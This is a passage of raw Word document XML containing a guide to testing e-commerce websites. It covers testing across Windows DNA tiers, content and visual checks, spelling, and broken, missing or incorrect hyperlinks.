        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Site visitors may vary from a beginning customer to a sophisticated customer. Therefore, the tester needs to simulate the actions of all kinds of customers to be sufficiently thorough in testing the e-commerce system. Simulating the actions poses great challenges to the tester.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Changes in the business environment, especially in terms of tax, shipping costs, multi-location delivery, and multi-location dispatch should also be simulated.</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Creating a test environment for e-commerce</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Creating a test environment for e-commerce applications is difficult because of the complexity of an e-commerce Web site and its interaction with the live world. This includes the Web clusters, middle-tier components, clustered database servers, firewalls, and so on. There is interaction with credit card companies, fulfillment houses, and customers. Therefore, simulating every possible action of the online customer is impossible because the tester cannot predict the actions of the site visitor. Also, the tester is unaware of the traffic intensity at peak times. Because the future of the site is unknown to the tester, the e-commerce Web site can be tested for certain standard functions but may not be tested for all contingencies.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Testing security</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Hackers have no standard method of breaking into e-commerce sites, so there are no standard methods of security testing. Also, there are few tools available to test security aspects thoroughly.</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6" w:name="testproc_types"/>
      <w:bookmarkEnd w:id="1286"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Semibold" w:hAnsi="Segoe UI Semibold"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Types of Testing for E-Commerce</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The e-commerce testing process is divided according to the three tiers of Windows DNA architecture.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="185"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Web Tier</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="185"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Web site content testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="185"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Web site testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="185"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Browser compatibility</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="185"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Middle Tier</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="185"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Software performance testing (business logic, tax, shipping calculations)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="185"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Server load testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="185"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Data Tier</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="185"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Database testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="185"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Search options</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="185"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Query response time</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="185"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Data integrity</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="185"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Data validity</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="185"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Recovery testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Specific tests that must be performed across the Windows DNA layers are:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="186"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Security</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="186"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Regression testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="186"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>User acceptance testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="186"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Unit testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="186"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>System testing</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7" w:name="testproc_web"/>
      <w:bookmarkEnd w:id="1287"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Semibold" w:hAnsi="Segoe UI Semibold"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Testing Web Tier</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Web Site Content Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>A Web site should be well planned, tested for errors, and finally presented to the online customers. Content testing is important to present a quality, error-free Web site.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Types of content testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The site should be attractive and customer-friendly. It should have:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="187"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Visual appeal</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="187"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>No grammatical and spelling errors</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="187"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Reliable and consistent information</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Visual appeal</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The visual appearance of a Web site is important to maintain repeat visits. Although the home page of an e-commerce site is the "breadwinner," catalog pages cannot be ignored. Regardless of the developer’s choice for color, font, or graphics, the tester needs to test for the appearance of the site and bring out problem areas.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Tests required to check the visual appeal of a site are described below.</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453"/>
        <w:gridCol w:w="3154"/>
        <w:gridCol w:w="3154"/>
      </w:tblGrid>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="14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What to Test</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="18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Environment</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="18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Tools/Technique</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lastRenderedPageBreak/>
              <w:t>Fonts</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Intensity of Colors</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Graphics</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Audio and Video</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Grammar and Spelling</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User/Development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GUI/Proofreading/Spell check</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">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Facts and Figures</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8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bl>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="188"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Browser compatibility for font style</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>There are a number of different fonts available on HTML editors these days. However, many of these fonts may not display on all browsers, especially on older versions. Or they may display as unreadable characters. Therefore, it’s important to test the browser for version compatibility.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="188"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Consistency of font size</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t xml:space="preserve">Test for consistency of font size throughout the Web site. A body text font size of 10 to </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>14,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t xml:space="preserve"> and a heading font size of 18 to 24 are the norm.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="188"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Colors</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Consider the combinations of foreground and background colors throughout the site. For example, it may be difficult to read yellow text on a white background.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="188"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Graphics</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Fewer graphics on a Web page aid in faster downloads. As much as possible, thumbnails should replace photographs. Developers must test for download time of graphics-intensive pages.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Grammatical and spelling errors in the content</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The home page requires special attention because it is the first page that the site visitor sees.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Use the spelling checker to check the spelling throughout the site. Sometimes there are errors that may not be checked by the spelling checker, such as “there” and “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>their</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Finally, make sure to proofread the entire site to check the grammar.</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Authenticity of facts provided</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Verify all facts and figures that relate to products and services. The testing team can verify these with the legal, marketing, and business groups.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Web Site Testing</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Proper functioning of hyperlinks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Hyperlinks in Web sites can be broken, missing, or improperly assigned. In all three cases, the site visitor is unable to navigate to the appropriate Web page. Therefore, check to make sure that all the links work properly.</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593"/>
        <w:gridCol w:w="1859"/>
        <w:gridCol w:w="1859"/>
      </w:tblGrid>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="15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What to Test</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="17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Environment</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="17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Tools/Technique</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Broken Links</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Missing Links</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Wrong Links</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bl>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Broken links</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>There may be times when the developer inadvertently changes the source folder of the graphics or the graphics file name while modifying the Web site. This causes a break in the link between the existing page and the linked page or the graphic. In this case, testing needs to done to detect broken links. For example, if a developer changes the name of the products page from "Product.htm" to "Products.htm," the link between the home page and the Products page breaks so that the Products page is no longer accessible from the home page.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lastRenderedPageBreak/>
        <w:t>Missing links</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Links that have not yet been created are called “missing links.” For example, a developer might forget to link a button on the home page with the Products page. Consequently, site visitors would not be able to access the Products page from the home page.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Incorrect links</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Incorrect links cause errors. These links can take a site visitor to the wrong page.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Testing hyperlinks helps to eliminate broken, missing, or wrongly assigned links. There is software available that helps to check broken and incorrect links. Missing links should be checked manually.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
